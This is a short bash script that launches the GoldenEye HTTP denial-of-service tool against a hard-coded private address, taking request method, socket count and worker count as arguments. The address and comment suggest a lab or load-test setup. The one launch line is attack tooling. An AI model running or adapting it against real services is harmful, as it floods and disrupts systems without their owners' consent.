#!/bin/bash

# get/post request, 30 socks, 50 workers works with at least 1 machine

if [ $# -ge 3 ]
then
    if [ "$1" ] && [ "$2" ] && [ "$3" ]
    then
        echo "START GOLDENEYE"
        sudo python goldeneye.py http://10.1.5.2:80/ -m $1 -s $2 -w $3 > /dev/null
    fi
else
    echo "YOU NEED TO SPECIFY REQUEST, SOCKS AND WORKERS"
fi
